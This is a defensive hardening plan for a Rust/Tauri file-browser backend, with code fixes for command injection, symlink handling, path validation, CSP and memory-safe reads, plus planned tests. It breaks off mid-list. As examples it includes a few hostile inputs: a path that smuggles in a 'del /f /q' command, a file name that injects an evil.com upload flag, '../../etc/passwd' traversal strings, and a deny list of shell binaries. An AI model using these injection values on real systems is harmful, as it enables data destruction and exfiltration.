# BrowseIt — Rust/Tauri Backend Hardening Plan

Scope: `src-tauri/src/lib.rs`, `Cargo.toml`, `tauri.conf.json`,
`capabilities/default.json`, and a new `src-tauri/tests/` directory.

Issues are grouped into **phases** ordered by risk and dependency.
Each item includes the exact code change required so implementation
is mechanical — no design decisions left open.

---

## Phase 1 — Critical: Fix Before Any Production Use

### 1.1  Windows terminal command injection (`open_in_terminal`)

**File:** `src-tauri/src/lib.rs:357-360`

**Problem:**
```rust
// CURRENT — dir is interpolated into a single string passed to cmd /k
.args(["/c", "start", "cmd", "/k", &format!("cd /d {}", dir)])
```
A path like `C:\foo & del /f /q C:\important` executes the second command.

**Fix:**
```rust
#[cfg(target_os = "windows")]
{
    // Pass dir as a separate argument — never as part of an interpolated string.
    // Use PowerShell so Set-Location accepts literal paths with special characters.
    std::process::Command::new("powershell")
        .args([
            "-NoExit",
            "-Command",
            "Set-Location",
            "-LiteralPath",
        ])
        .arg(&dir)   // <-- separate arg, never shell-split
        .spawn()
        .map_err(|e| format!("Failed to open terminal: {}", e))?;
}
```

**Test to add** (`tests/integration_test.rs`):
```rust
#[test]
fn open_in_terminal_windows_path_with_special_chars() {
    // Verify that a dir string containing '&', ';', and '|' is passed
    // as a single literal argument and does not produce extra tokens.
    // (Unit-test the argument construction, not the spawn itself.)
}
```

---

### 1.2  `run_custom_context_action` — path injected into args before shell-split

**File:** `src-tauri/src/lib.rs:380-426`

**Problem:**
```rust
let resolved_args = args.replace("{path}", &path).replace("{dir}", &dir);
// resolved_args is then passed to shell_words::split
```
A file named `report --upload=http://evil.com` will inject `--upload=http://evil.com`
as a real argument to the spawned command.

**Fix:** Substitute `{path}` / `{dir}` **after** shell-splitting, appending them
as positional arguments rather than embedding them in the template string.

```rust
#[tauri::command]
fn run_custom_context_action(command: String, args: String, path: String) -> Result<(), String> {
    let target_path = Path::new(&path);
    let dir = if target_path.is_dir() {
        path.clone()
    } else {
        target_path
            .parent()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|| path.clone())
    };

    // Split the template WITHOUT substituting path/dir first.
    // Only static args defined by the user in settings are shell-split.
    let template_args = args
        .replace("{path}", "")
        .replace("{dir}", "");
    let mut final_args: Vec<String> = shell_words::split(template_args.trim())
        .unwrap_or_default();

    // Append path/dir as separate, unquoted positional arguments.
    // They are passed directly to the OS, never re-parsed by a shell.
    if args.contains("{path}") {
        final_args.push(path.clone());
    }
    if args.contains("{dir}") {
        final_args.push(dir.clone());
    }

    // Validate command: must be an absolute path or a known-safe app name.
    // Reject anything that looks like a shell invocation.
    let forbidden_commands = ["/bin/sh", "/bin/bash", "/bin/zsh", "sh", "bash", "zsh",
                               "cmd", "powershell", "pwsh", "python", "ruby", "perl", "node"];
    let cmd_lower = command.to_lowercase();
    if forbidden_commands.iter().any(|&f| cmd_lower == f || cmd_lower.ends_with(&format!("/{}", f))) {
        return Err(format!(
            "Command '{}' is not allowed as a custom context action. \
             Use an application name or absolute path to a specific binary.", command
        ));
    }

    #[cfg(target_os = "macos")]
    {
        let mut cmd = if !command.contains('/') {
            let mut c = std::process::Command::new("open");
            c.arg("-a").arg(&command);
            c
        } else {
            std::process::Command::new(&command)
        };
        for arg in &final_args {
            cmd.arg(arg);
        }
        cmd.spawn().map_err(|e| format!("Failed to run '{}': {}", command, e))?;
    }

    #[cfg(not(target_os = "macos"))]
    {
        let mut cmd = std::process::Command::new(&command);
        for arg in &final_args {
            cmd.arg(arg);
        }
        cmd.spawn().map_err(|e| format!("Failed to run '{}': {}", command, e))?;
    }

    Ok(())
}
```

**Tests to add:**
```rust
#[test]
fn context_action_path_with_dashes_not_injected_as_flag() { ... }

#[test]
fn context_action_rejects_shell_commands() { ... }

#[test]
fn context_action_path_appended_as_separate_arg() { ... }
```

---

## Phase 2 — High: Data Safety and Memory Safety

### 2.1  Atomic config writes

**File:** `src-tauri/src/lib.rs:699-705`, `751-757`

**Problem:** `fs::write` truncates then writes. A crash mid-write leaves
an empty config, silently wiping all user settings and pinned folders.

**Add to `Cargo.toml`:**
```toml
tempfile = "3"
```

**Add helper function:**
```rust
/// Write `content` to `path` atomically: write to a sibling temp file,
/// then rename into place. On POSIX rename(2) is atomic. On Windows it
/// is not guaranteed but is still safer than truncate-then-write.
fn atomic_write(path: &Path, content: &str) -> Result<(), String> {
    let parent = path.parent().ok_or("Config path has no parent directory")?;
    // NamedTempFile is created in the same directory so rename stays on the same fs
    let mut tmp = tempfile::NamedTempFile::new_in(parent)
        .map_err(|e| format!("Failed to create temp file: {}", e))?;
    use std::io::Write;
    tmp.write_all(content.as_bytes())
        .map_err(|e| format!("Failed to write temp file: {}", e))?;
    tmp.flush()
        .map_err(|e| format!("Failed to flush temp file: {}", e))?;
    tmp.persist(path)
        .map_err(|e| format!("Failed to persist config file: {}", e))?;
    Ok(())
}
```

**Replace in `save_pinned_quick_access`:**
```rust
fn save_pinned_quick_access(paths: &[String]) -> Result<(), String> {
    let config_path = quick_access_config_path()?;
    let content = serde_json::to_string_pretty(paths)
        .map_err(|e| format!("Failed to serialize quick access: {}", e))?;
    atomic_write(&config_path, &content)
}
```

**Replace in `save_settings`:**
```rust
#[tauri::command]
fn save_settings(settings: AppSettings) -> Result<(), String> {
    let config_path = settings_config_path()?;
    let content = serde_json::to_string_pretty(&settings)
        .map_err(|e| format!("Failed to serialize settings: {}", e))?;
    atomic_write(&config_path, &content)
}
```

**Tests to add:**
```rust
#[test]
fn settings_roundtrip_survives_reread() { ... }

#[test]
fn save_settings_is_idempotent() { ... }
```

---

### 2.2  `read_text_file` — bounded read

**File:** `src-tauri/src/lib.rs:605-609`

**Problem:** `fs::read_to_string` reads the entire file before the 10 KB clip.
Pointing it at `/dev/zero` or a 10 GB log exhausts memory.

**Fix:**
```rust
#[tauri::command]
fn read_text_file(path: String) -> Result<String, String> {
    use std::io::Read;
    const MAX_READ_BYTES: u64 = 1024 * 1024; // 1 MB hard cap before UTF-8 decode

    let p = Path::new(&path);
    let meta = fs::symlink_metadata(p)
        .map_err(|e| format!("Failed to stat file: {}", e))?;

    // Reject non-regular files (devices, sockets, FIFOs, symlinks to /dev/zero, etc.)
    if !meta.is_file() {
        return Err("Not a regular file".to_string());
    }

    let file = fs::File::open(p)
        .map_err(|e| format!("Failed to open file: {}", e))?;

    let mut buf = Vec::with_capacity(MAX_READ_BYTES.min(meta.len()) as usize + 1);
    file.take(MAX_READ_BYTES)
        .read_to_end(&mut buf)
        .map_err(|e| format!("Failed to read file: {}", e))?;

    let text = String::from_utf8_lossy(&buf);
    Ok(text.chars().take(10_240).collect())
}
```

**Tests to add:**
```rust
#[test]
fn read_text_file_truncates_large_file() { ... } // write 2 MB, assert len <= 10_240 chars

#[test]
fn read_text_file_rejects_directory() { ... }

#[cfg(unix)]
#[test]
fn read_text_file_rejects_dev_null() { ... } // /dev/null is not is_file()
```

---

### 2.3  `compress_to_zip` — stream files instead of buffering in RAM

**File:** `src-tauri/src/lib.rs:511-513`, `554-560`

**Problem:** `fs::read(path)` reads an entire file into a `Vec<u8>` before
writing it to the zip. A 4 GB file will OOM the process.

**Fix for flat files (line 511):**
```rust
zip_writer
    .start_file(&file_name, options)
    .map_err(|e| format!("Failed to add file to zip: {}", e))?;
let mut f = std::io::BufReader::new(
    fs::File::open(src_path).map_err(|e| format!("Failed to open file: {}", e))?
);
std::io::copy(&mut f, &mut zip_writer)
    .map_err(|e| format!("Failed to write to zip: {}", e))?;
```

**Fix for `add_dir_to_zip` (line 557):**
```rust
zip_writer
    .start_file(&name, options)
    .map_err(|e| format!("Failed to add file to zip: {}", e))?;
let mut f = std::io::BufReader::new(
    fs::File::open(path).map_err(|e| format!("Failed to open file: {}", e))?
);
std::io::copy(&mut f, zip_writer)
    .map_err(|e| format!("Failed to write to zip: {}", e))?;
```

**Also add a per-file size guard** (prevent accidentally zipping `/dev/zero`):
```rust
// At the start of compress_to_zip, before creating the zip file:
const MAX_TOTAL_UNCOMPRESSED: u64 = 50 * 1024 * 1024 * 1024; // 50 GB sanity cap
// Walk sources and sum fs::metadata().len() before starting; return Err if over cap.
```

**Tests to add:**
```rust
#[test]
fn compress_zip_streams_large_file_without_oom() { ... } // 100 MB sparse file

#[test]
fn compress_zip_deduplicates_output_name() { ... } // archive.zip, archive (1).zip, ...

#[test]
fn compress_zip_directory_preserves_structure() { ... }
```

---

### 2.4  `copy_dir_recursive` — handle symlinks correctly

**File:** `src-tauri/src/lib.rs:252-268`

**Problem:** `src_path.is_dir()` follows symlinks. A symlink pointing to a
directory is recursively traversed; a symlink cycle causes infinite recursion
and stack overflow.

**Fix:**
```rust
fn copy_dir_recursive(src: &Path, dest: &Path) -> Result<(), String> {
    fs::create_dir_all(dest).map_err(|e| format!("Failed to create directory: {}", e))?;

    for entry in fs::read_dir(src).map_err(|e| format!("Failed to read directory: {}", e))? {
        let entry = entry.map_err(|e| e.to_string())?;
        let src_path = entry.path();
        let dest_path = dest.join(entry.file_name());

        // Use symlink_metadata so symlinks are NOT followed
        let meta = fs::symlink_metadata(&src_path)
            .map_err(|e| format!("Failed to stat {:?}: {}", src_path, e))?;

        if meta.is_symlink() {
            // Recreate the symlink at the destination rather than following it
            let target = fs::read_link(&src_path)
                .map_err(|e| format!("Failed to read symlink: {}", e))?;
            #[cfg(unix)]
            std::os::unix::fs::symlink(&target, &dest_path)
                .map_err(|e| format!("Failed to create symlink: {}", e))?;
            #[cfg(windows)]
            {
                if target.is_dir() {
                    std::os::windows::fs::symlink_dir(&target, &dest_path)
                        .map_err(|e| format!("Failed to create dir symlink: {}", e))?;
                } else {
                    std::os::windows::fs::symlink_file(&target, &dest_path)
                        .map_err(|e| format!("Failed to create file symlink: {}", e))?;
                }
            }
        } else if meta.is_dir() {
            copy_dir_recursive(&src_path, &dest_path)?;
        } else {
            fs::copy(&src_path, &dest_path)
                .map_err(|e| format!("Failed to copy {:?}: {}", src_path, e))?;
        }
    }
    Ok(())
}
```

**Tests to add:**
```rust
#[cfg(unix)]
#[test]
fn copy_dir_does_not_follow_symlinks() { ... }

#[cfg(unix)]
#[test]
fn copy_dir_symlink_cycle_does_not_infinite_loop() { ... }

#[test]
fn copy_dir_recreates_symlink_at_destination() { ... }
```

---

### 2.5  Path validation helper — wire into all destructive commands

**File:** `src-tauri/src/lib.rs` (new helper, call from all mutating commands)

**Problem:** Every command that mutates the filesystem accepts arbitrary paths
from the frontend with no validation. A compromised webview (e.g. XSS while
rendering a malicious HTML file) can delete, move, or overwrite any file.

**Add helper:**
```rust
/// Validates that `raw` is a safe path to operate on:
/// - Must be absolute
/// - Must not contain `..` components after lexical normalization
/// - Must not target filesystem roots or OS-critical directories
///
/// Returns the normalized PathBuf on success.
fn validate_user_path(raw: &str) -> Result<PathBuf, String> {
    let p = Path::new(raw);

    if !p.is_absolute() {
        return Err(format!("Rejected relative path: {}", raw));
    }

    // Lexically normalize (collapse . and ..) without hitting the filesystem
    let mut normalized = PathBuf::new();
    for component in p.components() {
        match component {
            std::path::Component::ParentDir => { normalized.pop(); }
            std::path::Component::CurDir    => {}
            _                               => normalized.push(component),
        }
    }

    // Reject paths that ARE a forbidden root, or are directly inside one
    #[cfg(unix)]
    let forbidden: &[&str] = &[
        "/",
        "/bin", "/sbin", "/usr/bin", "/usr/sbin",
        "/etc", "/private/etc",
        "/System", "/Library/System",
        "/proc", "/sys", "/dev",
    ];
    #[cfg(windows)]
    let forbidden: &[&str] = &[
        "C:\\Windows", "C:\\Windows\\System32",
        "C:\\Program Files", "C:\\Program Files (x86)",
    ];

    for root in forbidden {
        let root_path = Path::new(root);
        if normalized == root_path {
            return Err(format!("Access to '{}' is not allowed", raw));
        }
        // Also block writes *inside* forbidden trees (except "/" which would match everything)
        if *root != "/" && normalized.starts_with(root_path) {
            return Err(format!("Access to paths under '{}' is not allowed", root));
        }
    }

    Ok(normalized)
}
```

**Wire into every destructive command:**

| Command | Lines | Change |
|---|---|---|
| `create_directory` | 194-196 | `let path = validate_user_path(&path)?;` at top |
| `create_file` | 199-207 | same |
| `rename_item` | 210-212 | validate both `old_path` and `new_path` |
| `delete_items` | 215-229 | validate each path in the loop before the delete block |
| `copy_items` | 232-250 | validate each source and the destination |
| `move_items` | 272-298 | validate each source and the destination |
| `compress_to_zip` | 457-522 | validate each source path |
| `read_text_file` | 605-609 | validate path |
| `open_file` | 306-308 | validate path |

For read-only commands (`list_directory`, `get_file_info`, `search_files`)
the validation is optional but still recommended to block path-traversal
attempts that could leak the existence of sensitive files.

**Tests to add:**
```rust
#[test]
fn validate_user_path_rejects_relative() { ... }

#[test]
fn validate_user_path_rejects_dotdot() { ... } // "/../etc/passwd"

#[test]
fn validate_user_path_rejects_system_roots() { ... } // "/System", "/etc"

#[test]
fn validate_user_path_accepts_home_subpath() { ... }

#[test]
fn delete_items_rejects_system_path() { ... }

#[test]
fn create_file_rejects_dotdot_path() { ... }
```

---

## Phase 3 — High: Enable Content Security Policy

**File:** `src-tauri/tauri.conf.json`

**Problem:** `"csp": null` means the webview has no content security policy.
If the app renders a malicious HTML file, injected scripts can call any
Tauri command.

**Fix:**
```json
"security": {
  "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: asset: https://asset.localhost; connect-src ipc: http://ipc.localhost; font-src 'self' data:"
}
```

Breaking down the policy:
- `script-src 'self'` — only scripts bundled with the app can execute
- `style-src 'unsafe-inline'` — needed for CSS-in-JS / inline styles used by React
- `img-src data: asset:` — allows base64 and Tauri asset protocol icons
- `connect-src ipc:` — allows Tauri IPC, blocks arbitrary outbound HTTP from scripts
- Everything else defaults to `'self'`

**Note:** After adding CSP, run `npm run tauri dev` and check the browser
console for any CSP violations, then tighten or loosen specific directives
as needed. The `unsafe-inline` on `style-src` can often be replaced with
a nonce or hash once the component library is audited.

---

## Phase 4 — Medium: Error Handling and Robustness

### 4.1  Structured error type

**File:** `src-tauri/src/lib.rs`

**Problem:** All errors are `String`. The frontend cannot distinguish
"permission denied" from "not found" from "disk full" without string parsing.

**Add to `Cargo.toml`:**
```toml
thiserror = "1"
```

**Add error type:**
```rust
#[derive(Debug, thiserror::Error, Serialize)]
#[serde(tag = "kind", content = "message")]
pub enum AppError {
    #[error("Not found: {0}")]
    NotFound(String),

    #[error("Permission denied: {0}")]
    PermissionDenied(String),

    #[error("Invalid input: {0}")]
    InvalidInput(String),

    #[error("IO error: {0}")]
    Io(String),

    #[error("Disk full")]
    DiskFull,
}

impl From<std::io::Error> for AppError {
    fn from(e: std::io::Error) -> Self {
        use std::io::ErrorKind::*;
        match e.kind() {
            NotFound            => AppError::NotFound(e.to_string()),
            PermissionDenied    => AppError::PermissionDenied(e.to_string()),
            StorageFull         => AppError::DiskFull,
            _                   => AppError::Io(e.to_string()),
        }
    }
}
```

Migrate commands from `Result<T, String>` to `Result<T, AppError>` one at a time,
starting with the most user-facing ones: `delete_items`, `copy_items`, `move_items`.

The frontend `TauriFilesystemProvider.ts` can then pattern-match on `error.kind`
to show specific messages ("You don't have permission to delete this file" vs
"File not found").

---

### 4.2  `delete_items` — report partial failures

**File:** `src-tauri/src/lib.rs:215-229`

**Problem:** First `?` propagation aborts; items already deleted are gone,
remaining items are untouched, caller gets one error string.

**Add result type:**
```rust
#[derive(Debug, Serialize)]
pub struct BatchResult {
    pub succeeded: Vec<String>,
    pub failed: Vec<(String, String)>, // (path, error message)
}
```

**Replace `delete_items` return type:**
```rust
#[tauri::command]
fn delete_items(paths: Vec<String>, use_trash: bool) -> Result<BatchResult, String> {
    let mut result = BatchResult { succeeded: vec![], failed: vec![] };

    for path in paths {
        // Validate before any destructive action
        let validated = match validate_user_path(&path) {
            Ok(p) => p,
            Err(e) => { result.failed.push((path, e)); continue; }
        };

        let outcome = if use_trash {
            trash::delete(&validated).map_err(|e| e.to_string())
        } else {
            let meta = fs::symlink_metadata(&validated).map_err(|e| e.to_string());
            match meta {
                Err(e) => Err(e),
                Ok(m) if m.is_dir() && !m.is_symlink() =>
                    fs::remove_dir_all(&validated).map_err(|e| e.to_string()),
                _ =>
                    fs::remove_file(&validated).map_err(|e| e.to_string()),
            }
        };

        match outcome {
            Ok(())  => result.succeeded.push(path),
            Err(e)  => result.failed.push((path, e)),
        }
    }
    Ok(result)
}
```

Apply the same `BatchResult` pattern to `copy_items` and `move_items`.

---

### 4.3  `move_items` — don't swallow rename errors silently

**File:** `src-tauri/src/lib.rs:284`

**Problem:**
```rust
if fs::rename(src_path, &target).is_err() {
    // falls through to copy+delete even for permission errors
}
```

**Fix:**
```rust
match fs::rename(src_path, &target) {
    Ok(()) => {}
    Err(e) => {
        // Only fall back to copy+delete for cross-device moves (EXDEV on Unix)
        #[cfg(unix)]
        let is_cross_device = e.raw_os_error() == Some(libc::EXDEV);
        #[cfg(not(unix))]
        let is_cross_device = e.kind() == std::io::ErrorKind::CrossesDevices
            || e.raw_os_error() == Some(17); // ERROR_NOT_SAME_DEVICE on Windows

        if !is_cross_device {
            return Err(format!("Failed to move '{}': {}", source, e));
        }

        // Cross-device: copy then delete
        if meta.is_dir() && !meta.is_symlink() {
            copy_dir_recursive(src_path, &target)?;
            fs::remove_dir_all(src_path)
                .map_err(|e| format!("Failed to remove source directory: {}", e))?;
        } else {
            fs::copy(src_path, &target)
                .map_err(|e| format!("Failed to copy file: {}", e))?;
            fs::remove_file(src_path)
                .map_err(|e| format!("Failed to remove source file: {}", e))?;
        }
    }
}
```

**Add to `Cargo.toml`:**
```toml
libc = "0.2"
```

---

### 4.4  `search_files` — cap `max_results` server-side

**File:** `src-tauri/src/lib.rs:566-594`

```rust
fn search_files(directory: String, query: String, max_results: usize) -> Result<SearchResult, String> {
    if query.is_empty() {
        return Err("Search query must not be empty".to_string());
    }
    if query.len() > 256 {
        return Err("Search query is too long".to_string());
    }
    let max_results = max_results.min(10_000); // server-side cap regardless of caller
    // ... rest unchanged
```

---

### 4.5  Log silently-dropped entries in `list_directory`

**File:** `src-tauri/src/lib.rs:105-117`

Replace silent `continue` with a `log::warn!`:
```rust
for entry in read_dir {
    match entry {
        Err(e) => {
            log::warn!("list_directory: failed to read entry in {}: {}", path, e);
            continue;
        }
        Ok(entry) => {
            let path = entry.path();
            match file_entry_from_path_safe(&path) {
                Ok(file_entry) => {
                    if show_hidden || !file_entry.is_hidden {
                        entries.push(file_entry);
                    }
                }
                Err(e) => {
                    log::warn!("list_directory: skipping {:?}: {}", path, e);
                }
            }
        }
    }
}
```

---

## Phase 5 — Medium: Real Disk Space in `get_volumes`

**File:** `src-tauri/src/lib.rs:162-191`

**Problem:** `total_space` and `available_space` are always 0.
The root volume is always named "Macintosh HD".

**Add to `Cargo.toml`:**
```toml
sysinfo = { version = "0.30", default-features = false, features = ["disk"] }
```

**Replace `get_volumes`:**
```rust
#[tauri::command]
fn get_volumes() -> Result<Vec<DiskInfo>, String> {
    use sysinfo::{Disks, RefreshKind};

    let disks = Disks::new_with_refreshed_list();
    let mut result: Vec<DiskInfo> = disks
        .iter()
        .map(|d| DiskInfo {
            name: d.name().to_string_lossy().to_string(),
            mount_point: d.mount_point().to_string_lossy().to_string(),
            total_space: d.total_space(),
            available_space: d.available_space(),
        })
        .collect();

    // Sort: root/primary volume first
    result.sort_by(|a, b| a.mount_point.len().cmp(&b.mount_point.len()));

    Ok(result)
}
```

This works cross-platform (macOS, Windows, Linux) and uses the actual
volume label instead of the hardcoded "Macintosh HD".

---

## Phase 6 — Medium: Platform-Correct Config Directory

**File:** `src-tauri/src/lib.rs:629-644`

**Problem:** Config is always written to `~/.config/browseit` regardless of
platform. On macOS the correct location is `~/Library/Application Support`,
on Windows it is `%APPDATA%`.

**Add to `Cargo.toml`** (replace the hand-rolled `mod dirs`):
```toml
dirs = "5"
```

**Remove the hand-rolled `mod dirs` block (lines 629-635) and replace
`config_dir` function:**
```rust
fn config_dir() -> Result<PathBuf, String> {
    let base = dirs::config_dir()
        .or_else(|| dirs::home_dir().map(|h| h.join(".config")))
        .ok_or("Cannot determine config directory")?;
    let config_dir = base.join("browseit");
    fs::create_dir_all(&config_dir)
        .map_err(|e| format!("Failed to create config directory: {}", e))?;
    Ok(config_dir)
}
```

`dirs::config_dir()` returns:
- `~/Library/Application Support` on macOS
- `%APPDATA%` on Windows
- `$XDG_CONFIG_HOME` or `~/.config` on Linux

Also replace `get_home_directory` to use the `dirs` crate:
```rust
#[tauri::command]
fn get_home_directory() -> Result<String, String> {
    dirs::home_dir()
        .map(|p| p.to_string_lossy().to_string())
        .ok_or_else(|| "Could not determine home directory".to_string())
}
```

---

## Phase 7 — Low: Remaining Correctness Fixes

### 7.1  `is_hidden` on Windows

**File:** `src-tauri/src/lib.rs:44-46`

```rust
fn is_hidden(name: &str, #[cfg(windows)] metadata: &fs::Metadata) -> bool {
    #[cfg(unix)]
    { name.starts_with('.') }

    #[cfg(windows)]
    {
        use std::os::windows::fs::MetadataExt;
        const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;
        metadata.file_attributes() & FILE_ATTRIBUTE_HIDDEN != 0
    }
}
```

Update all call sites to pass metadata on Windows.

---

### 7.2  `rename_item` — guard against cross-directory moves

**File:** `src-tauri/src/lib.rs:210-212`

`rename_item` is used by the inline rename UI, which should only change the
filename within the same directory. Silently allowing cross-directory moves
is surprising.

```rust
#[tauri::command]
fn rename_item(old_path: String, new_path: String) -> Result<(), String> {
    let old = validate_user_path(&old_path)?;
    let new = validate_user_path(&new_path)?;

    // Enforce same-directory constraint for the rename command
    if old.parent() != new.parent() {
        return Err("rename_item: source and destination must be in the same directory. \
                    Use move_items for cross-directory moves.".to_string());
    }

    fs::rename(&old, &new).map_err(|e| format!("Failed to rename: {}", e))
}
```

---

### 7.3  `copy_items` and `move_items` — reject copying into itself

**File:** `src-tauri/src/lib.rs:238-249`, `278-295`

```rust
// At the top of the sources loop:
if dest_path.starts_with(src_path) {
    return Err(format!(
        "Cannot copy '{}' into itself (destination is inside source)", source
    ));
}
```

---

### 7.4  `WINDOW_COUNTER` overflow

**File:** `src-tauri/src/lib.rs:431-435`

Cosmetic but cheap to fix:
```rust
let id = WINDOW_COUNTER.fetch_add(1, Ordering::Relaxed);
if id > 100 {
    return Err("Too many windows open".to_string());
}
```

---

## Phase 8 — Test Coverage

Currently there are **zero Rust tests**. Tests should live in
`src-tauri/tests/` (integration tests) and `src-tauri/src/lib.rs`
under `#[cfg(test)]` (unit tests).

### Unit tests (`src-tauri/src/lib.rs` — `#[cfg(test)]` module)

```
test_is_hidden_dotfile
test_is_hidden_non_dotfile
test_system_time_to_epoch_before_unix_epoch
test_validate_user_path_rejects_relative
test_validate_user_path_rejects_dotdot
test_validate_user_path_rejects_root
test_validate_user_path_rejects_etc
test_validate_user_path_accepts_home
test_get_path_components_root
test_get_path_components_deep
test_get_path_components_relative  (should error after path validation)
test_zip_deduplication_counter_strips_previous_suffix
```

### Integration tests (`src-tauri/tests/integration_test.rs`)

Each test uses `tempfile::TempDir` to create real files and dirs,
then calls the command functions directly (they are plain Rust functions,
no Tauri wiring needed for unit/integration testing).

```
test_list_directory_returns_entries
test_list_directory_hides_dotfiles
test_list_directory_shows_hidden_when_flag_set
test_list_directory_permission_denied              (Unix: chmod 000)
test_list_directory_not_a_directory
test_list_directory_nonexistent
test_create_file_creates_parent_dirs
test_create_file_already_exists_is_ok             (File::create is idempotent)
test_create_directory_nested
test_rename_item_renames_file
test_rename_item_rejects_cross_directory_move
test_rename_item_rejects_dotdot
test_delete_items_deletes_file
test_delete_items_deletes_directory_recursively
test_delete_items_partial_failure_reports_both
test_delete_items_rejects_system_path
test_copy_items_copies_file
test_copy_items_copies_directory_recursively
test_copy_items_rejects_copy_into_itself
test_copy_dir_recursive_handles_symlinks          (Unix)
test_copy_dir_recursive_no_infinite_loop_on_cycle (Unix)
test_move_items_same_filesystem
test_move_items_cross_device_fallback             (create two TempDirs on different mounts)
test_move_items_permission_error_is_not_silently_ignored
test_search_files_finds_matches
test_search_files_respects_depth_limit
test_search_files_empty_query_returns_error
test_search_files_max_results_capped_at_10000
test_read_text_file_truncates_to_10240_chars
test_read_text_file_rejects_directory
test_read_text_file_bounded_large_file            (1 MB sparse file → no OOM)
test_compress_to_zip_single_file
test_compress_to_zip_directory
test_compress_to_zip_deduplicates_name
test_compress_to_zip_streams_do_not_oom           (100 MB sparse file)
test_settings_roundtrip
test_save_settings_atomic_on_crash                (verify temp file approach)
test_pinned_quick_access_add_remove
test_pinned_quick_access_filters_nonexistent
test_context_action_path_not_injected_as_flag
test_context_action_rejects_shell_binary
test_open_in_terminal_windows_no_injection        (Windows only)
```

### Security tests (`src-tauri/tests/security_test.rs`)

```
test_no_path_traversal_delete            // path = "../../etc/passwd"
test_no_relative_path_create
test_no_access_to_etc
test_no_access_to_system                 (macOS)
test_no_access_to_windows_system32       (Windows)
test_read_text_file_dev_null_rejected    (Unix)
test_compress_zip_slip_rejected          // entry named "../../evil" stripped
test_context_action_sh_rejected
test_context_action_absolute_sh_rejected // "/bin/sh" rejected
```

---

## Phase 9 — Deep Audit: Copy / Move / Delete (Second Pass)

A line-by-line re-read of the three operations found the following issues
that were not covered in Phases 1–8.

---

### 9.1  Delete: symlink-to-directory deletes the *target*, not the link  ⚠️ CRITICAL

**File:** `src-tauri/src/lib.rs:221-224`

```rust
// CURRENT — is_dir() follows symlinks
if p.is_dir() {
    fs::remove_dir_all(p)  // deletes the symlink target's contents!
```

If the user selects a symlink that points to a directory, `is_dir()` returns
`true`, and `remove_dir_all` is called on the symlink path. On Linux and macOS
this removes the symlink itself but on some OS/filesystem combinations it can
recurse into the target. Regardless, the intent is wrong: the user selected a
symlink, not its target. The code branch should always be `remove_file` for a
symlink.

**Fix:**
```rust
let meta = fs::symlink_metadata(p)
    .map_err(|e| format!("Failed to stat {}: {}", path, e))?;

if meta.is_dir() && !meta.is_symlink() {
    fs::remove_dir_all(p)
        .map_err(|e| format!("Failed to delete directory: {}", e))?;
} else {
    // Covers regular files, symlinks (to files OR dirs), and special files
    fs::remove_file(p)
        .map_err(|e| format!("Failed to delete: {}", e))?;
}
```

**Tests:**
```
test_delete_symlink_to_dir_removes_link_not_target
test_delete_symlink_to_file_removes_link_not_target
```

---

### 9.2  Delete: `trash::delete` skips path validation  ⚠️ HIGH

**File:** `src-tauri/src/lib.rs:218`

The `use_trash = true` branch passes the raw user-supplied string directly
to `trash::delete` with no path validation. When Phase 2.5 path validation
is added, it must be applied to **both** branches:

```rust
for path in paths {
    let validated = validate_user_path(&path)?;   // <-- before the if/else
    if use_trash {
        trash::delete(&validated)...
    } else {
        ...
    }
}
```

---

### 9.3  Delete: `remove_dir_all` is not atomic — partial tree on failure  (Medium)

`remove_dir_all` walks the tree and removes entries one by one. If it
encounters a permission-denied file halfway through, the directory is left
partially deleted. This cannot be fully fixed at the application level (it
is an OS limitation), but the user should receive a clear error that names
the specific file that blocked deletion, and the UI should indicate the
directory is in an unknown state. The structured error type (Phase 4.1)
is a prerequisite for surfacing this properly.

---

### 9.4  Delete: read-only files fail silently on Windows  (Low)

`remove_file` on a read-only file returns `PermissionDenied` on Windows even
when the user owns it. Explorer prompts and offers to proceed. BrowseIt
returns a generic error.

**Fix:** attempt to clear the read-only attribute before deleting:
```rust
#[cfg(windows)]
{
    let mut perms = fs::metadata(p)?.permissions();
    perms.set_readonly(false);
    let _ = fs::set_permissions(p, perms); // best-effort; ignore error
}
```

---

### 9.5  Copy: silent overwrite of existing destination files  ⚠️ HIGH

**File:** `src-tauri/src/lib.rs:241-246`

`fs::copy(src, target)` overwrites `target` silently if it already exists.
No warning, no prompt. A user copying `report.pdf` into a directory that
already contains `report.pdf` loses the original destination file without
any indication.

**Fix:** check for existence before copying and return a conflict error:
```rust
let target = dest_path.join(file_name);
if target.exists() {
    return Err(format!(
        "Destination already exists: {}. \
         Overwrite must be confirmed by the caller.", 
        target.display()
    ));
}
```

The frontend should then offer Skip / Overwrite / Rename options and re-call
with a resolved target name. Alternatively extend the return type to include
a `conflicts: Vec<String>` field so the frontend can present them all at once.

---

### 9.6  Copy: destination directory created before conflict check  (Medium)

**File:** `src-tauri/src/lib.rs:253`

`copy_dir_recursive` calls `fs::create_dir_all(dest)` as its very first
action. If the copy then fails (disk full, permissions, conflict), the
destination directory was already created and is now an empty ghost entry.
The user must clean it up manually.

**Fix:** do a pre-flight existence/conflict check before `create_dir_all`.
Alternatively, build a rollback list: push every created path onto a
`Vec<PathBuf>` and remove them all if any step returns `Err`.

---

### 9.7  Copy: outer `is_dir()` check follows symlinks  ⚠️ HIGH

**File:** `src-tauri/src/lib.rs:243`

```rust
if src_path.is_dir() {
    copy_dir_recursive(src_path, &target)?;
```

`is_dir()` follows symlinks. A symlink pointing to a large directory tree
is silently expanded into a full materialized copy at the destination.
The user selected a 4 KB symlink; they get gigabytes copied.

This is the outer check in `copy_items` and is a separate bug from the
inner check inside `copy_dir_recursive` (fixed in Phase 2.4).

**Fix:**
```rust
let meta = fs::symlink_metadata(src_path)
    .map_err(|e| format!("Failed to stat source: {}", e))?;

if meta.is_symlink() {
    // Recreate symlink at destination
    let link_target = fs::read_link(src_path)
        .map_err(|e| format!("Failed to read symlink: {}", e))?;
    #[cfg(unix)]
    std::os::unix::fs::symlink(&link_target, &target)
        .map_err(|e| format!("Failed to create symlink: {}", e))?;
} else if meta.is_dir() {
    copy_dir_recursive(src_path, &target)?;
} else {
    fs::copy(src_path, &target)
        .map_err(|e| format!("Failed to copy file: {}", e))?;
}
```

---

### 9.8  Copy: file permissions and timestamps not preserved  (Medium)

**File:** `src-tauri/src/lib.rs:246`, `265`

`fs::copy` copies content only. Permissions, timestamps, and extended
attributes are not copied. This matters for:
- Shell scripts: execute bit lost → script no longer runnable
